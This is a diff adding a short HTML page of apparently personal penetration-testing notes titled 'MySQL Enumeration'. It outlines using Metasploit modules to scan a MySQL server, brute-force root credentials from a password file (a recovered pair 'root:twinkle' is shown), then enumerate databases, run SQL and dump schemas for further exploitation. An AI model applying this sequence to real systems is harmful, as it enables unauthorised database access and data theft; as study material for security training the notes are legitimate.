@@ -1,0 +1,49 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MySQL Enumeration</title>
+</head><body>MySQL is used by a majority of the web apps<br/>
+<br/>
+port used by wordpress is 3306<br/>
+<br/>
+version of Mysql versions and these have the vulnerabilities<br/>
+<br/>
+now the version is exposed<br/>
+<br/>
+use portscan module to confirm target has this same version<br/>
+<br/>
+tnow work on the mysql_login module<br/>
+<br/>
+set pass_file, username root, set verbose false<br/>
+<br/>
+run<br/>
+<br/>
+it will brute force and will give the logins for my sql <br/>
+<br/>
+root:twinkle<br/>
+<br/>
+now try to login to mysql<br/>
+<br/>
+use auxiliary/admin/mysql/mysql_enum<br/>
+<br/>
+information reveals that we need to set the password and username<br/>
+<br/>
+give the root and twinkle as password<br/>
+<br/>
+then run it will reveal the database information<br/>
+<br/>
+Now next phase for MYSQL is <br/>
+<br/>
+searc mysql_sql<br/>
+<br/>
+use it and set admin and password<br/>
+<br/>
+set sql show databases;<br/>
+<br/>
+it will return the databases names<br/>
+<br/>
+from here you can add the queries and execute them to more exploitation<br/>
+<br/>
+use mysql_schemadump for the tables to expose<br/>
+&nbsp;</body></html>
